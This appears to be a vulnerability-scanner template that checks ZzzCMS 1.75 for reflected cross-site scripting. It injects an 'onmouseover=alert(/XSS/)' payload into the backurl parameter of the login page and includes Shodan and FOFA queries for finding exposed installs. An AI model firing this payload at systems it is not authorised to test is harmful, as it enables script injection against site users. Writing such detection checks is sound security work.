id: zzzcms-xss

info:
  name: Zzzcms 1.75 - Cross-Site Scripting
  author: ritikchaddha
  severity: medium
  metadata:
    max-request: 1
    verified: true
    shodan-query: html:"ZzzCMS"
    fofa-query: title="ZzzCMS"
  tags: zzzcms,xss

http:
  - raw:
      - |
        GET /plugins/template/login.php?backurl=1%20onmouseover%3dalert(/XSS/)%20y%3d HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'onmouseover=alert(/XSS/) y=&act'
          - 'document.write("'
        condition: and

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200
